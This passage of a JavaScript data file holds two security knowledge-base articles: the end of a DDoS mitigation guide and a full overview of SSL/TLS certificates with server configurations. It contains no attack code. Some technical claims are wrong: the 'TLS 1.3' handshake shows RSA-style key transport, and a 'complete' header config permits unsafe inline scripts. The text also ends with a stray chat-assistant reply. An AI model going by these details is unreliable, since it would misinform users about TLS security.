limit: '1mb', extended: true }));\n\n// Timeouts\nconst timeout = require('connect-timeout');\napp.use(timeout('5s'));\napp.use((req, res, next) => {\n  if (!req.timedout) next();\n});\n```\n\n### DNS Protection\n\n```bash\n# Disable DNS recursion (prevent amplification)\n# named.conf\noptions {\n  recursion no;\n  allow-query { localhost; };\n};\n\n# Rate limit DNS queries\nrate-limit {\n  responses-per-second 5;\n  window 5;\n};\n```\n\n## Cloud-Based DDoS Protection\n\n### AWS Shield\n\n```\nAWS Shield Standard (Free)\n├─ Protection against common attacks\n├─ Layer 3/4 protection\n└─ Automatic, always-on\n\nAWS Shield Advanced ($3000/month)\n├─ Enhanced protection\n├─ Layer 7 protection\n├─ DDoS Response Team (DRT)\n├─ Cost protection (avoid scaling charges)\n└─ Real-time attack visibility\n```\n\n### Cloudflare\n\n```javascript\n// Cloudflare automatically mitigates DDoS\n\n// Enable \"Under Attack Mode\" via API\nconst response = await fetch(\n  'https://api.cloudflare.com/client/v4/zones/{zone_id}/settings/security_level',\n  {\n    method: 'PATCH',\n    headers: {\n      'Authorization': `Bearer ${token}`,\n      'Content-Type': 'application/json'\n    },\n    body: JSON.stringify({ value: 'under_attack' })\n  }\n);\n\n// Shows challenge page to all visitors\n// Blocks most bots automatically\n```\n\n## Best Practices\n\n```javascript\n// ✅ Use CDN with DDoS protection\n// Cloudflare, AWS CloudFront, Akamai\n\n// ✅ Implement rate limiting\napp.use('/api/', rateLimit({ max: 100 }));\n\n// ✅ Enable connection limits\nserver.maxConnections = 1000;\n\n// ✅ Set timeouts\nserver.setTimeout(30000);\n\n// ✅ Monitor traffic patterns\nsetInterval(() => {\n  const rps = getRequestsPerSecond();\n  if (rps > threshold) alert('High traffic');\n}, 60000);\n\n// ✅ Use WAF rules\n// Block known attack patterns\n\n// ✅ Keep infrastructure updated\n// Patched systems resist known exploits\n\n// ✅ Have incident response plan\n// Know what to do when attacked\n\n// ❌ Don't expose origin server IP\n// Always behind CDN/proxy\n\n// ❌ Don't ignore small attacks\n// Test runs before major attack\n\n// ❌ Don't have single point of failure\n// Distribute across regions\n\n// ❌ Don't disable security for convenience\n// Keep protections enabled\n```\n\n## Incident Response\n\n```javascript\n// DDoS Response Checklist\n\n1. Detect\n   ├─ Monitor shows traffic spike\n   ├─ Users report unavailability\n   └─ Alerts triggered\n\n2. Assess\n   ├─ Identify attack type (volume/protocol/app)\n   ├─ Check affected services\n   └─ Estimate impact\n\n3. Mitigate\n   ├─ Enable \"Under Attack Mode\" (Cloudflare)\n   ├─ Block malicious IPs\n   ├─ Enable stricter rate limits\n   └─ Contact DDoS protection service\n\n4. Monitor\n   ├─ Watch traffic patterns\n   ├─ Verify mitigation working\n   └─ Adjust rules as needed\n\n5. Recover\n   ├─ Gradually relax restrictions\n   ├─ Verify normal operation\n   └─ Document incident\n\n6. Post-Mortem\n   ├─ Analyze attack patterns\n   ├─ Improve defenses\n   └─ Update response procedures\n```\n\n## Legal Aspects\n\n```\nDDoS attacks are illegal in most countries:\n\nUS: Computer Fraud and Abuse Act (CFAA)\n├─ Up to 10 years prison\n└─ Fines up to $500,000\n\nUK: Computer Misuse Act\n├─ Up to 10 years prison\n└─ Unlimited fines\n\nEU: Network and Information Security Directive\n└─ Criminal prosecution\n\nEven \"testing\" is illegal without authorization\nHiring DDoS services (booters/stressers) is illegal\n```\n\n## References\n\n- [Cloudflare DDoS Learning](https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/)\n- [AWS Shield](https://aws.amazon.com/shield/)\n- [OWASP DDoS Prevention](https://owasp.org/www-community/attacks/Denial_of_Service)\n\n---\n\n## Summary\n\n**DoS:** Single source overwhelms target.\n**DDoS:** Multiple sources (botnet) attack simultaneously.\n\n**Attack Types:**\n- Volume: Bandwidth exhaustion (UDP flood)\n- Protocol: Resource exhaustion (SYN flood)\n- Application: Logic abuse (HTTP flood, Slowloris)\n\n**Mitigation:**\n```javascript\n// Rate limiting\napp.use(rateLimit({ max: 100 }));\n\n// CDN (Cloudflare, AWS)\n// Absorbs attack traffic\n\n// WAF rules\n// Block malicious patterns\n\n// Timeouts\nserver.setTimeout(30000);\n```\n\n**Detection:**\n- Traffic spike (10x normal)\n- Many IPs from different locations\n- Identical request patterns\n- High CPU/memory/connections\n\n**Rule of thumb:** Use CDN with DDoS protection. Implement rate limiting. Monitor traffic patterns. Have incident response plan. Block at network edge, not application. Contact DDoS protection service during attack."
    },
    {
      "id": "swe/security/web-security/ssl",
      "title": "SSL/TLS Certificates: Complete Overview",
      "path": [
        "swe",
        "security",
        "web-security",
        "ssl"
      ],
      "content": "# SSL/TLS Certificates: Complete Overview\n\nSSL (Secure Sockets Layer) and its successor TLS (Transport Layer Security) are cryptographic protocols that encrypt data transmitted between a web browser and server, ensuring privacy and data integrity. When you see the padlock icon and \"https://\" in your browser, that's SSL/TLS in action—creating a secure tunnel that prevents eavesdropping, tampering, or impersonation. Think of SSL/TLS like sending a letter in a locked box that only the recipient can open, versus sending a postcard that anyone can read.\n\n## Key Points\n\n- **Purpose:** Encrypts data between browser and server (protects passwords, credit cards, personal info)\n- **HTTPS:** HTTP over SSL/TLS (the \"S\" means \"Secure\")\n- **Certificate:** Digital document that proves a website's identity\n- **Encryption:** Uses public/private key pairs to secure communication\n- **Modern Standard:** TLS 1.2 and TLS 1.3 (SSL is outdated but name persists)\n\n## High-Level Overview\n\n### What is SSL/TLS?\n\nSSL/TLS is a security protocol that creates an encrypted connection between a client (your browser) and a server (the website). This encryption ensures that any data exchanged—passwords, credit card numbers, personal information—cannot be intercepted or read by third parties.\n\n**Core concept:** SSL/TLS provides three key guarantees:\n1. **Encryption:** Data is scrambled so only the intended recipient can read it\n2. **Authentication:** Confirms you're connecting to the real website, not an imposter\n3. **Data Integrity:** Ensures data isn't tampered with during transmission\n\n### Why It Matters\n\n```\nWithout SSL/TLS (HTTP):\nUser → [Password: abc123] → Router → ISP → Server\n       ↑ Anyone can read this (plain text)\n\nWith SSL/TLS (HTTPS):\nUser → [Encrypted: xK9$mP2...] → Router → ISP → Server\n       ↑ Only server can decrypt this\n\nBenefits:\n- Protects sensitive data (login credentials, payments)\n- Prevents man-in-the-middle attacks\n- Required for modern web features (geolocation, webcam)\n- Improves SEO (Google prioritizes HTTPS sites)\n- Builds user trust (browsers warn on non-HTTPS sites)\n```\n\n### How SSL/TLS Works (Simplified)\n\n```\n1. Client Hello: Browser contacts server requesting secure connection\n2. Server Hello: Server sends SSL certificate (proves identity)\n3. Verification: Browser verifies certificate with Certificate Authority (CA)\n4. Key Exchange: Browser and server agree on encryption keys\n5. Secure Connection: Encrypted communication begins\n\nTimeline:\nBrowser ─────────────────────────────────→ Server\n        \"I want secure connection\"\n        \nBrowser ←───────────────────────────────── Server\n        \"Here's my certificate + public key\"\n        \nBrowser verifies certificate with CA\n        \"Certificate is valid ✓\"\n        \nBrowser ─────────────────────────────────→ Server\n        \"Here's encrypted session key\"\n        \n🔒 Encrypted connection established\n```\n\n## Detailed Breakdown\n\n### 1. SSL Certificate Components\n\nAn SSL certificate contains several key pieces of information:\n\n```\nCertificate Details:\n┌─────────────────────────────────────┐\n│ Common Name (CN): example.com       │\n│ Organization: Example Inc.          │\n│ Location: San Francisco, CA, US     │\n│ Valid From: 2024-01-01             │\n│ Valid To: 2025-01-01               │\n│ Public Key: [cryptographic key]    │\n│ Issuer: Let's Encrypt Authority X3  │\n│ Signature: [CA's digital signature] │\n└─────────────────────────────────────┘\n\nThe certificate proves:\n✅ The website is who they claim to be\n✅ A trusted authority verified their identity\n✅ The certificate hasn't expired\n```\n\n### 2. Types of SSL Certificates\n\n```typescript\n// Domain Validation (DV) - Basic\n// Verifies only domain ownership\n// Issued in minutes\n// Free options available (Let's Encrypt)\n// Good for: Blogs, personal sites, development\n\nCertificate: example.com\nValidation: Automated (email or DNS verification)\nCost: Free - $50/year\nTrust Level: Low (just proves domain ownership)\n\n// Organization Validation (OV) - Business\n// Verifies domain + organization details\n// Issued in 1-3 days\n// Shows organization name in certificate\n// Good for: Business websites, e-commerce\n\nCertificate: example.com\nOrganization: Example Inc.\nValidation: Manual review of business documents\nCost: $50 - $200/year\nTrust Level: Medium (proves business legitimacy)\n\n// Extended Validation (EV) - High Trust\n// Most rigorous validation\n// Issued in 1-2 weeks\n// Shows organization name in address bar (older browsers)\n// Good for: Banking, high-security sites\n\nCertificate: example.com\nOrganization: Example Inc. [Verified]\nValidation: Extensive legal/business verification\nCost: $200 - $1000/year\nTrust Level: High (maximum assurance)\n```\n\n### 3. Certificate Types by Coverage\n\n```\nSingle Domain:\nCertificate covers: example.com\nDoes NOT cover: www.example.com, mail.example.com\n\nWildcard:\nCertificate covers: *.example.com\nCovers: www.example.com, mail.example.com, api.example.com\nDoes NOT cover: example.com (base domain), sub.api.example.com\n\nMulti-Domain (SAN - Subject Alternative Name):\nCertificate covers: example.com, www.example.com, shop.example.com\nCan also cover: different-domain.com\nGood for: Multiple related sites\n\nExample wildcard certificate:\nCN: *.example.com\nSANs:\n  - *.example.com\n  - example.com  (often included)\n\nCovers:\n✅ www.example.com\n✅ api.example.com\n✅ blog.example.com\n✅ example.com (if in SANs)\n❌ sub.api.example.com (too many levels)\n```\n\n### 4. The Handshake Process (Technical Details)\n\n```\nStep-by-step TLS 1.3 handshake:\n\n1. Client Hello\n   Browser → Server\n   {\n     \"supported_versions\": [\"TLS 1.3\", \"TLS 1.2\"],\n     \"cipher_suites\": [\"AES_256_GCM\", \"CHACHA20_POLY1305\"],\n     \"random_bytes\": \"xK9mP2...\" // Prevents replay attacks\n   }\n\n2. Server Hello + Certificate\n   Server → Browser\n   {\n     \"selected_version\": \"TLS 1.3\",\n     \"selected_cipher\": \"AES_256_GCM\",\n     \"certificate\": \"-----BEGIN CERTIFICATE-----...\",\n     \"server_random\": \"aB3nQ7...\"\n   }\n\n3. Certificate Verification\n   Browser checks:\n   ✓ Is certificate signed by trusted CA?\n   ✓ Is certificate valid (not expired)?\n   ✓ Does certificate match domain?\n   ✓ Is certificate not revoked?\n\n4. Key Exchange\n   Browser generates session key, encrypts with server's public key\n   Browser → Server: [encrypted session key]\n\n5. Secure Connection Established\n   All subsequent data encrypted with session key\n   🔒 HTTPS connection active\n```\n\n### 5. Certificate Authorities (CAs)\n\nCertificate Authorities are trusted organizations that issue SSL certificates after verifying identity.\n\n```\nRoot Certificate Authorities (trusted by browsers):\n- DigiCert\n- Let's Encrypt (free, automated)\n- Sectigo (formerly Comodo)\n- GlobalSign\n- GoDaddy\n\nChain of Trust:\nRoot CA (pre-installed in browser/OS)\n  ↓\nIntermediate CA (issues certificates)\n  ↓\nYour Certificate (for example.com)\n\nBrowser verifies:\nYour Cert → signed by → Intermediate CA → signed by → Root CA ✓\n\nIf any link breaks, browser shows security warning\n```\n\n### 6. Common SSL/TLS Issues\n\n```javascript\n// Issue 1: Mixed Content Warning\n// HTTPS page loading HTTP resources\n\n// ❌ Bad: Insecure resource on secure page\n<script src=\"http://example.com/script.js\"></script>\n<img src=\"http://example.com/image.jpg\" />\n\n// Browser warning: \"This page contains insecure content\"\n\n// ✅ Good: All resources use HTTPS\n<script src=\"https://example.com/script.js\"></script>\n<img src=\"https://example.com/image.jpg\" />\n\n// ✅ Better: Protocol-relative URLs (uses same protocol as page)\n<script src=\"//example.com/script.js\"></script>\n\n// Issue 2: Certificate Name Mismatch\n// Visiting: https://example.com\n// Certificate issued for: www.example.com\n// ❌ Browser error: \"Certificate doesn't match domain\"\n\n// Solution: Get certificate covering both (SAN certificate)\n\n// Issue 3: Expired Certificate\n// Certificate valid until: 2024-01-01\n// Current date: 2024-01-15\n// ❌ Browser error: \"Certificate has expired\"\n\n// Solution: Renew certificate before expiration\n\n// Issue 4: Self-Signed Certificate\n// Certificate signed by website itself, not trusted CA\n// ❌ Browser error: \"Certificate not trusted\"\n\n// Solution: Get certificate from trusted CA\n```\n\n### 7. Setting Up SSL/TLS\n\n```bash\n# Option 1: Let's Encrypt (Free, Automated)\n# Install Certbot\nsudo apt-get install certbot python3-certbot-nginx\n\n# Generate certificate for Nginx\nsudo certbot --nginx -d example.com -d www.example.com\n\n# Certbot automatically:\n# - Generates certificate\n# - Configures Nginx\n# - Sets up auto-renewal\n\n# Certificate stored at:\n# /etc/letsencrypt/live/example.com/fullchain.pem\n# /etc/letsencrypt/live/example.com/privkey.pem\n\n# Auto-renewal (cron job created automatically)\n# Certificate renews every 60 days\n\n# Option 2: Commercial Certificate\n# 1. Generate Certificate Signing Request (CSR)\nopenssl req -new -newkey rsa:2048 -nodes \\\n  -keyout example.com.key \\\n  -out example.com.csr\n\n# 2. Purchase certificate from CA (DigiCert, Sectigo, etc.)\n# 3. Submit CSR to CA\n# 4. Complete validation process\n# 5. Download certificate files\n# 6. Install on server\n```\n\n### Nginx Configuration\n\n```nginx\n# Basic HTTPS configuration\nserver {\n    listen 443 ssl http2;\n    server_name example.com www.example.com;\n    \n    # Certificate files\n    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;\n    \n    # Modern SSL configuration\n    ssl_protocols TLSv1.2 TLSv1.3;\n    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';\n    ssl_prefer_server_ciphers off;\n    \n    # HSTS (force HTTPS for 1 year)\n    add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;\n    \n    # Security headers\n    add_header X-Frame-Options \"SAMEORIGIN\" always;\n    add_header X-Content-Type-Options \"nosniff\" always;\n    \n    location / {\n        root /var/www/html;\n        index index.html;\n    }\n}\n\n# Redirect HTTP to HTTPS\nserver {\n    listen 80;\n    server_name example.com www.example.com;\n    return 301 https://$server_name$request_uri;\n}\n```\n\n### Apache Configuration\n\n```apache\n# Enable SSL module\nsudo a2enmod ssl\n\n# Virtual host configuration\n<VirtualHost *:443>\n    ServerName example.com\n    ServerAlias www.example.com\n    \n    DocumentRoot /var/www/html\n    \n    # SSL Configuration\n    SSLEngine on\n    SSLCertificateFile /etc/letsencrypt/live/example.com/fullchain.pem\n    SSLCertificateKeyFile /etc/letsencrypt/live/example.com/privkey.pem\n    \n    # Modern SSL settings\n    SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1\n    SSLCipherSuite HIGH:!aNULL:!MD5\n    SSLHonorCipherOrder on\n    \n    # HSTS\n    Header always set Strict-Transport-Security \"max-age=31536000; includeSubDomains\"\n</VirtualHost>\n\n# Redirect HTTP to HTTPS\n<VirtualHost *:80>\n    ServerName example.com\n    Redirect permanent / https://example.com/\n</VirtualHost>\n```\n\n## Similarities Between SSL/TLS Versions\n\n### 1. Core Purpose\n\nAll versions provide the same fundamental security guarantees:\n\n```\nAll SSL/TLS versions provide:\n✅ Encryption (confidentiality)\n✅ Authentication (identity verification)\n✅ Data integrity (tamper detection)\n\nWhether SSL 3.0 or TLS 1.3, the goal is the same:\nSecure communication between client and server\n```\n\n### 2. Certificate Structure\n\n```\nAll versions use the same certificate format:\n- X.509 standard certificates\n- Same fields (CN, Organization, Valid dates)\n- Signed by Certificate Authorities\n- Public/Private key pairs\n\nA certificate issued for TLS 1.3 works with TLS 1.2\nThe protocol version is negotiated separately\n```\n\n### 3. Handshake Concept\n\n```\nAll versions follow the same basic handshake pattern:\n1. Client initiates connection\n2. Server presents certificate\n3. Client verifies certificate\n4. Both agree on encryption method\n5. Secure connection established\n\nThe details differ, but the flow is consistent\n```\n\n## Differences Between SSL/TLS Versions\n\n### 1. Security Level\n\n```\nSSL 2.0 (1995) - OBSOLETE\n❌ Critically insecure\n❌ Disabled in all modern browsers\n❌ Never use\n\nSSL 3.0 (1996) - OBSOLETE\n❌ POODLE vulnerability (2014)\n❌ Disabled in modern browsers\n❌ Never use\n\nTLS 1.0 (1999) - DEPRECATED\n⚠️  Weak by modern standards\n⚠️  Deprecated by major browsers (2020)\n⚠️  Only for legacy compatibility\n\nTLS 1.1 (2006) - DEPRECATED\n⚠️  Slight improvement over 1.0\n⚠️  Deprecated by major browsers (2020)\n⚠️  Only for legacy compatibility\n\nTLS 1.2 (2008) - CURRENT STANDARD\n✅ Secure with proper configuration\n✅ Widely supported\n✅ Recommended minimum version\n\nTLS 1.3 (2018) - LATEST\n✅ Most secure\n✅ Faster handshake (1-RTT)\n✅ Removes weak algorithms\n✅ Growing support\n✅ Preferred when available\n```\n\n### 2. Handshake Speed\n\n```\nTLS 1.2 Handshake: 2 round trips (2-RTT)\nClient ──[ClientHello]──────────────→ Server\n        (350ms network latency)\nClient ←─[ServerHello+Certificate]── Server\n        (350ms network latency)\nClient ──[KeyExchange+Finished]────→ Server\n        (350ms network latency)\nClient ←─[Finished]──────────────── Server\n        (350ms network latency)\nTotal: ~1400ms before encrypted data can be sent\n\nTLS 1.3 Handshake: 1 round trip (1-RTT)\nClient ──[ClientHello+KeyShare]────→ Server\n        (350ms network latency)\nClient ←─[ServerHello+Finished]──── Server\n        (350ms network latency)\nTotal: ~700ms before encrypted data can be sent\n\nSpeed improvement: 50% faster with TLS 1.3\n```\n\n### 3. Cipher Suites\n\n```\nTLS 1.2: Many cipher options (some weak)\nSupports:\n- RSA key exchange (vulnerable to decrypt later)\n- CBC mode (vulnerable to BEAST, Lucky13)\n- MD5, SHA-1 (weak hash functions)\n- Export ciphers (intentionally weak)\n\nExample weak TLS 1.2 cipher:\nTLS_RSA_WITH_3DES_EDE_CBC_SHA ❌\n\nTLS 1.3: Only strong ciphers\nRequires:\n- Forward secrecy (ECDHE, DHE key exchange only)\n- AEAD encryption (GCM, ChaCha20-Poly1305)\n- Strong hashes (SHA256, SHA384)\n\nExample TLS 1.3 cipher:\nTLS_AES_256_GCM_SHA384 ✅\n\nSecurity: TLS 1.3 removes all weak algorithms\n```\n\n### 4. Browser/Server Configuration\n\n```nginx\n# TLS 1.2 Configuration (complex, many options)\nssl_protocols TLSv1.2;\nssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384';\nssl_prefer_server_ciphers on;\n# Must carefully choose secure ciphers\n\n# TLS 1.3 Configuration (simpler, secure by default)\nssl_protocols TLSv1.3;\n# That's it! All TLS 1.3 ciphers are secure\n# No need to manually configure cipher list\n```\n\n### 5. Performance Impact\n\n```\nTLS 1.2:\n- More CPU intensive (complex cipher negotiation)\n- 2-RTT handshake adds latency\n- Can use session resumption to speed up reconnections\n\nTLS 1.3:\n- Less CPU usage (simpler algorithms)\n- 1-RTT handshake (50% faster)\n- 0-RTT mode for returning clients (even faster)\n\nReal-world impact:\nTLS 1.2: ~100-200ms handshake overhead\nTLS 1.3: ~50-100ms handshake overhead\n\nFor high-traffic sites: Significant performance gain\n```\n\n## Common Pitfalls\n\n- Using outdated SSL/TLS versions (SSL 3.0, TLS 1.0/1.1)\n- Forgetting to redirect HTTP to HTTPS (insecure connections allowed)\n- Not renewing certificates (site becomes inaccessible when expired)\n- Mixed content warnings (loading HTTP resources on HTTPS page)\n- Certificate name mismatch (www vs non-www)\n- Not implementing HSTS (allows protocol downgrade attacks)\n- Using self-signed certificates in production (users see warnings)\n\n## Practical Applications\n\n- E-commerce (protect credit card information)\n- Login pages (secure passwords and authentication)\n- APIs (protect API keys and sensitive data)\n- Email (secure SMTP, IMAP, POP3 connections)\n- VPNs (encrypt network traffic)\n- IoT devices (secure device communication)\n\n## References\n\n- [Let's Encrypt](https://letsencrypt.org/) - Free SSL certificates\n- [SSL Labs Test](https://www.ssllabs.com/ssltest/) - Test your SSL configuration\n- [Mozilla SSL Configuration Generator](https://ssl-config.mozilla.org/) - Generate secure configs\n- [TLS 1.3 RFC 8446](https://tools.ietf.org/html/rfc8446) - Official specification\n- [OWASP TLS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)\n\n---\n\n## Greater Detail\n\n### Certificate Renewal Automation\n\n```bash\n# Let's Encrypt auto-renewal with Certbot\n# Cron job automatically created at:\n# /etc/cron.d/certbot\n\n# Manual renewal test (dry run)\nsudo certbot renew --dry-run\n\n# Force renewal (if needed)\nsudo certbot renew --force-renewal\n\n# Renewal hooks (run commands after renewal)\nsudo certbot renew --deploy-hook \"systemctl reload nginx\"\n\n# Check certificate expiration\necho | openssl s_client -servername example.com -connect example.com:443 2>/dev/null | openssl x509 -noout -dates\n\n# Output:\n# notBefore=Jan  1 00:00:00 2024 GMT\n# notAfter=Apr  1 00:00:00 2025 GMT\n```\n\n### Advanced Security Headers\n\n```nginx\n# Complete security headers configuration\nadd_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\n# Force HTTPS for 1 year, include all subdomains, allow browser preload\n\nadd_header X-Frame-Options \"SAMEORIGIN\" always;\n# Prevent clickjacking attacks\n\nadd_header X-Content-Type-Options \"nosniff\" always;\n# Prevent MIME type sniffing\n\nadd_header X-XSS-Protection \"1; mode=block\" always;\n# Enable XSS filtering (legacy browsers)\n\nadd_header Referrer-Policy \"strict-origin-when-cross-origin\" always;\n# Control referrer information\n\nadd_header Content-Security-Policy \"default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'\" always;\n# Restrict resource loading\n\nadd_header Permissions-Policy \"geolocation=(), microphone=(), camera=()\" always;\n# Control browser features\n```\n\n### Certificate Pinning (Advanced)\n\n```javascript\n// HTTP Public Key Pinning (HPKP) - DEPRECATED, don't use\n// Modern alternative: Certificate Transparency + monitoring\n\n// Instead, monitor certificates with Certificate Transparency\nconst checkCertificate = async (domain) => {\n  const response = await fetch(`https://crt.sh/?q=${domain}&output=json`);\n  const certificates = await response.json();\n  \n  // Alert if unexpected certificate found\n  certificates.forEach(cert => {\n    if (!isExpectedIssuer(cert.issuer_name)) {\n      alert(`Unexpected certificate issuer: ${cert.issuer_name}`);\n    }\n  });\n};\n```\n\n### Testing SSL/TLS Configuration\n\n```bash\n# Test with OpenSSL\nopenssl s_client -connect example.com:443 -servername example.com\n\n# Output shows:\n# - TLS version negotiated\n# - Cipher suite used\n# - Certificate chain\n# - Expiration dates\n\n# Test specific TLS version\nopenssl s_client -connect example.com:443 -tls1_2\nopenssl s_client -connect example.com:443 -tls1_3\n\n# Test cipher support\nnmap --script ssl-enum-ciphers -p 443 example.com\n\n# Online tools:\n# - SSL Labs: https://www.ssllabs.com/ssltest/\n# - SecurityHeaders.com: https://securityheaders.com/\n```\n\n### Best Practices Summary\n\n```nginx\n# ✅ Recommended Nginx SSL configuration (2024)\nserver {\n    listen 443 ssl http2;\n    listen [::]:443 ssl http2;\n    server_name example.com;\n    \n    # Certificates\n    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;\n    ssl_trusted_certificate /etc/letsencrypt/live/example.com/chain.pem;\n    \n    # Protocols (only TLS 1.2 and 1.3)\n    ssl_protocols TLSv1.2 TLSv1.3;\n    \n    # Ciphers (strong modern ciphers only)\n    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';\n    ssl_prefer_server_ciphers off;\n    \n    # Session settings\n    ssl_session_timeout 1d;\n    ssl_session_cache shared:SSL:50m;\n    ssl_session_tickets off;\n    \n    # OCSP stapling (faster certificate validation)\n    ssl_stapling on;\n    ssl_stapling_verify on;\n    resolver 8.8.8.8 8.8.4.4 valid=300s;\n    resolver_timeout 5s;\n    \n    # Security headers\n    add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\n    add_header X-Frame-Options \"SAMEORIGIN\" always;\n    add_header X-Content-Type-Options \"nosniff\" always;\n}\n\n# Redirect HTTP to HTTPS\nserver {\n    listen 80;\n    listen [::]:80;\n    server_name example.com;\n    return 301 https://$server_name$request_uri;\n}\n```\n\n### Cost Comparison\n\n```\nFree Options:\n- Let's Encrypt: $0 (DV only, automated)\n  ✅ Perfect for most websites\n  ✅ 90-day certificates (auto-renewed)\n  ✅ Wildcard certificates supported\n  \nCommercial DV:\n- $10-50/year\n  → No real advantage over Let's Encrypt\n  \nCommercial OV:\n- $50-200/year\n  → Shows organization name in certificate\n  → Required for some compliance (PCI-DSS)\n  \nCommercial EV:\n- $200-1000/year\n  → Highest validation level\n  → Shows organization in address bar (legacy)\n  → Required for banking, high-security\n  \nWildcard:\n- Let's Encrypt: $0\n- Commercial: $100-500/year\n  \nMulti-Domain (SAN):\n- Let's Encrypt: $0 (up to 100 domains)\n- Commercial: $100-500/year\n```\n\nThis structure now matches your preferred format with high-level overviews, similarities, and differences sections. Let me know if you'd like me to adjust anything!"
    }
  ]
};
